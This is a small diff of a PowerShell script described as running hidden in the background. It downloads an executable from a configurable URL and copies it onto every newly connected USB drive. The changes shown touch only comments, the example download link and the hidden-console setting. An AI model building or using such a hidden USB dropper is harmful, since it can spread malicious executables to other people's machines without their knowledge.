@@ -2,7 +2,7 @@
 
 SYNOPSIS
 This script runs quietly in the background waiting for new USB storage devices.
-When a new storage device connects, this script will copy a desired file to the root of newly connected drive.
+When a new device connects, this script will copy a desired file to the root of newly connected drive.
 
 USAGE
 1. REPLACE the example file URL with your own.
@@ -13,10 +13,10 @@ USAGE
 
 #>
 
-# Replace with your file direct download link
+# Replace with your file direct download / raw link
 $fileURL = 'https://raw.githubusercontent.com/username/repo/main/folder/yourfile.exe'
 
-# Hidden Console
+# Hidden Console (y/n)
 $hidden = 'y'
 
 $filename = Split-Path -Path $fileURL -Leaf
